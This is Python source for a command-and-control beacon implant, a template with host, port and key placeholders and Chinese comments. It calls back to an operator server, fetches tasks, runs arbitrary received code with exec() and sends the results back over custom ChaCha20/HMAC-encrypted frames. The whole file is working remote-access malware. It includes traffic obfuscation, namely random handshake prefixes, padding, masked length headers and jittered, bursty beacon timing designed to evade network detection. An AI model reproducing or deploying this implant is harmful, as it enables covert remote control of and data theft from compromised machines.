import socket as sock, struct as st, zlib as zl, random as rnd, time as tm, json as js, sys as sy, traceback as tb, io as io_, secrets as sec, threading as thr, hashlib as hl, hmac as hmac_

MASTER_KEY = bytes({{XOR_KEY_BYTES}})
HOST = "{{HOST}}"
PORT = {{PORT}}
INTERVAL = {{INTERVAL}}
JITTER = {{JITTER}}
# 分段载荷(agent_stager)同 id 语义: 引导代码已把 id 存入全局 BEACON_ID 时
# 直接复用(否则 server 视新 id 为新 beacon, 会再次下发 stage 第二段, 二次
# exec 清空 _KNOWN/_PENDING/_ACTIVE 状态 + 泄漏线程, 2026-08-27 修复)
BEACON_ID = globals().get("BEACON_ID") or sec.token_hex(8)
BREAK_FLAG = False
CONN_KEY = MASTER_KEY

# ── 模块短名契约(D2): 植入端模块(set_host/set_key/fork/shell)与
# uplevel 升级代码(transport_base)依赖这些全局名,勿改 ──
_D = BEACON_ID            # 当前 beacon id
_H = HOST                 # server 地址(set_host 模块修改,connect_transport 读取)
_P = PORT                 # server 端口(set_host 模块修改,connect_transport 读取)
_K = MASTER_KEY           # 部署密钥(set_key 模块修改)
_CK = MASTER_KEY          # 当前连接密钥(uplevel _disp 按通道层切换;cycle 每轮 CONN_KEY=_CK)
_B = BREAK_FLAG           # break 标志(主循环检查 _B)
_I = INTERVAL             # 回连间隔(set_interval 模块修改,sleep_jitter 读取)
_J = JITTER               # 回连抖动(set_interval 模块修改,sleep_jitter 读取)

def _T():
    """连接函数(uplevel 升级代码覆盖 _T 实现多级回退通道)。"""
    return connect_transport()

# connect_transport 传输钩子: uplevel 升级代码可覆盖 _T/_H/_P/_K
def connect_transport():
    conn = sock.socket()
    conn.settimeout(30)
    conn.connect((_H, _P))
    # 混淆: TCP 首包 256B 随机前缀(服务端 handshake 吞掉;HTTPS/DNS 变体不走此)
    conn.sendall(sec.token_bytes(256))
    return conn

def qround(state, x, y, z, w):
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 16 | (state[w] ^ state[x]) >> 16) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 12 | (state[y] ^ state[z]) >> 20) & 0xffffffff
    state[x] = (state[x] + state[y]) & 0xffffffff
    state[w] = ((state[w] ^ state[x]) << 8 | (state[w] ^ state[x]) >> 24) & 0xffffffff
    state[z] = (state[z] + state[w]) & 0xffffffff
    state[y] = ((state[y] ^ state[z]) << 7 | (state[y] ^ state[z]) >> 25) & 0xffffffff

def block(key, nonce, counter):
    state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(st.unpack("<8I", key)) + [counter] + list(st.unpack("<3I", nonce))
    work = state[:]
    for _ in range(10):
        qround(work, 0, 4, 8, 12); qround(work, 1, 5, 9, 13)
        qround(work, 2, 6, 10, 14); qround(work, 3, 7, 11, 15)
        qround(work, 0, 5, 10, 15); qround(work, 1, 6, 11, 12)
        qround(work, 2, 7, 8, 13); qround(work, 3, 4, 9, 14)
    return st.pack("<16I", *[(work[i] + state[i]) & 0xffffffff for i in range(16)])

def xor_stream(data, key, nonce):
    buf = bytearray()
    counter = 0
    for i in range(0, len(data), 64):
        buf += bytes(u ^ v for u, v in zip(data[i:i + 64], block(key, nonce, counter)))
        counter += 1
    return bytes(buf)

def encode_frame_(data):
    # 帧封装: zlib→ChaCha20→HMAC→帧尾 0-255B 随机 padding+1B pad_len(混淆长度分布)
    compressed = zl.compress(data)
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce = sec.token_bytes(12)
    ciphertext = xor_stream(compressed, enc, nonce)
    sealed = nonce + ciphertext + hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()
    pad_len = rnd.randint(0, 255)
    return sealed + sec.token_bytes(pad_len) + bytes([pad_len])

def decode_frame_(data):
    pad_len = data[-1]
    if len(data) < 12 + 32 + 1 + pad_len:
        raise ValueError("bad frame")
    sealed = data[: -1 - pad_len]
    enc, mac_key = hl.sha256(b"e" + CONN_KEY).digest(), hl.sha256(b"m" + CONN_KEY).digest()
    nonce, ciphertext, tag = sealed[:12], sealed[12:-32], sealed[-32:]
    if not hmac_.compare_digest(tag, hmac_.new(mac_key, nonce + ciphertext, hl.sha256).digest()):
        raise ValueError("MAC")
    return zl.decompress(xor_stream(ciphertext, enc, nonce))

def _frame_mask():
    """长度头掩码(与 server core/protocol.frame_mask 一致,固定值)。"""
    return int.from_bytes(hl.sha256(CONN_KEY + b"len").digest()[:4], "big")

def send_frame(conn, data):
    encoded = encode_frame_(data)
    conn.sendall(st.pack(">I", len(encoded) ^ _frame_mask()) + encoded)

def recv_frame(conn):
    header = b""
    while 4 - len(header):
        chunk = conn.recv(4 - len(header))
        if not chunk:
            raise ConnectionError()
        header += chunk
    length = st.unpack(">I", header)[0] ^ _frame_mask()
    if length == 0:
        return b""
    payload = b""
    while length - len(payload):
        chunk = conn.recv(length - len(payload))
        if not chunk:
            raise ConnectionError()
        payload += chunk
    return decode_frame_(payload)

# ── 批量任务模型(v2): 本地并发执行 + 结果暂存 + 回连上报 ──
# 线程本地输出捕获: 多任务线程并发执行,print/sys.stdout 各进各的 buffer,
# 互不污染(替代旧模型的全局重定向 + PRINT_LOCK 串行)。
_TLS = thr.local()
_TLS_MAX_OUT = 400000   # 单条结果安全截断(帧上限 512KB 的余量,防撑爆整批)

class _ThreadStream:
    def __init__(self, kind):
        self._kind = kind
    def write(self, s):
        buf = getattr(_TLS, "buf", None)
        if buf is not None:
            buf[0 if self._kind == "out" else 1].write(str(s))
        else:
            (sy.__stdout__ if self._kind == "out" else sy.__stderr__).write(str(s))
    def flush(self):
        pass

sy.stdout = _ThreadStream("out")
sy.stderr = _ThreadStream("err")

_PENDING = {}        # task_id -> {"output": str, "error": str}(已完成、未获 ACK)
_PENDING_LOCK = thr.Lock()
_KNOWN = set()       # 已领取的 task_id(HTTPS/DNS 无状态通道可能重复下发,防重复执行)
_KNOWN_LOCK = thr.Lock()
_ACTIVE = {}         # task_id -> 线程(正在执行的任务,含持久任务;register 上报 running)
_ACTIVE_LOCK = thr.Lock()
_RECORDS = {}        # task_id -> {"output","error","ts"}(record 型任务: 只记录不上报)
_RECORDS_LOCK = thr.Lock()

class _TaskCancelled(BaseException):
    """任务被 stop 命令取消的标记异常(继承 BaseException,避免被任务代码的
    except Exception 吞掉;KeyboardInterrupt 会触发解释器 SIGINT 状态污染退出码)。"""
    pass

def _run_one_task(task_id, code, record=False):
    out_buf, err_buf = io_.StringIO(), io_.StringIO()
    _TLS.buf = (out_buf, err_buf)
    try:
        exec(code, globals())
    except _TaskCancelled:
        # 被 stop 命令取消: 静默退出, 不产生结果(线程结束由 finally 清 _ACTIVE)
        return
    except Exception:
        err_buf.write(tb.format_exc())
    finally:
        _TLS.buf = None
        with _ACTIVE_LOCK:
            _ACTIVE.pop(task_id, None)   # 执行结束(含被取消)移出运行中
    out, err = out_buf.getvalue(), err_buf.getvalue()
    if len(out) > _TLS_MAX_OUT:
        out = out[: _TLS_MAX_OUT] + "\n... (truncated, %d bytes total)" % len(out)
    if record:
        # record 型任务: 只记录本地(不上报), record 模块可查
        with _RECORDS_LOCK:
            _RECORDS[task_id] = {"output": out, "error": err, "ts": tm.time()}
        return
    with _PENDING_LOCK:
        _PENDING[task_id] = {"output": out, "error": err}

def spawn_task(task_id, code, record=False):
    if not task_id:
        return
    with _KNOWN_LOCK:
        if task_id in _KNOWN:
            return  # 已领取过(重复下发),跳过
        _KNOWN.add(task_id)
    th = thr.Thread(target=_run_one_task, args=(task_id, code, record), daemon=True)
    with _ACTIVE_LOCK:
        _ACTIVE[task_id] = th
    th.start()

def _cancel_task(task_id):
    """终止指定运行中任务: 向任务线程异步抛 KeyboardInterrupt。

    Python 线程无法强制 kill,用 ctypes SetAsyncExc 在目标线程的字节码
    边界抛异常——`while True: pass` 类死循环可被打断;任务代码若全捕获
    BaseException 则无效(罕见)。阻塞在 socket.recv 的线程延迟到 IO 返回。
    被取消的任务线程退出时 _run_one_task 的 finally 清 _ACTIVE,不产生结果。
    """
    with _ACTIVE_LOCK:
        th = _ACTIVE.get(task_id)
    if th is None or not th.is_alive():
        return False
    try:
        import ctypes as _ct
        # 注意: SetAsyncExc 第二参必须传"异常类"(type), 传实例会报
        # SystemError: _PyErr_SetObject: exception ... is not a BaseException subclass
        _ct.pythonapi.PyThreadState_SetAsyncExc(
            _ct.c_long(th.ident), _ct.py_object(_TaskCancelled))
        return True
    except Exception:
        return False

def _handle_tasks(msg):
    """处理 TASKS 帧: acked 清理已确认结果 + tasks 去重领取。"""
    for tid in msg.get("acked") or []:
        with _PENDING_LOCK:
            _PENDING.pop(tid, None)
    for t in msg.get("tasks") or []:
        code = t.get("code", "")
        if code.startswith("!cancel "):
            _cancel_task(code[8:].strip())   # 任务终止指令(server stop 命令下发)
            continue
        spawn_task(t.get("task_id", ""), code, bool(t.get("record", False)))

def sleep_jitter():
    # 回连间隔(混淆): [0.75I, 1.5I] 均匀随机,无最短下限(原 max(5,±) 有周期下界)
    return rnd.uniform(_I * 0.75, _I * 1.5)

def cycle():
    global CONN_KEY
    conn = None
    try:
        conn = _T()          # 可能更新 _CK(_disp 连接成功设置层密钥)
        CONN_KEY = _CK       # 直连=_K(set_key 生效);uplevel 后=当前通道层密钥
        send_frame(conn, js.dumps({"type": "register", "version": 2, "role": "beacon", "id": BEACON_ID, "batch": True,
                                   "running": sorted(_ACTIVE)}).encode())
        while True:
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "welcome":
                break
            if mtype == "error":
                return
        # ① 上报已完成结果(逐条: 发一帧收一帧,收确认 + 顺带任务)
        with _PENDING_LOCK:
            pending = list(_PENDING.items())
        for task_id, res in pending:
            send_frame(conn, js.dumps({"type": "result", "task_id": task_id, "output": res["output"], "error": res["error"]}).encode())
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "tasks":
                _handle_tasks(msg)
            elif mtype in ("pong", "error"):
                return
            else:
                return
        # ② 请求并领取全部待执行任务(TASKS 帧可能多批,空批或 PONG 即取完)
        send_frame(conn, js.dumps({"type": "fetch"}).encode())
        while True:
            msg = js.loads(recv_frame(conn).decode())
            mtype = msg.get("type")
            if mtype == "tasks":
                _handle_tasks(msg)
                if not msg.get("tasks"):
                    break  # 空批 = 取完(agent 一问一答模式下 server 无更多任务)
            elif mtype in ("pong", "error"):
                break
    except Exception:
        pass
    finally:
        if conn is not None:
            try:
                conn.close()
            except Exception:
                pass

# 主循环(混淆时序): 30% 长间隔(跳 1-3 周期) + 30% 突发(1-3s 内连回),破坏周期性
_burst_left = 0
while True:
    if _B:
        break
    cycle()
    if _burst_left:
        _burst_left -= 1
        # 突发间隔 5-15s(原 1-3s 成簇短连特征太明显,拉长后仍短于主体间隔)
        tm.sleep(rnd.uniform(5, 15))
        continue
    base = sleep_jitter()
    if rnd.random() < 0.3:
        base *= rnd.uniform(2, 4)
    elif rnd.random() < 0.3:
        _burst_left = rnd.randint(1, 2)
    tm.sleep(base)
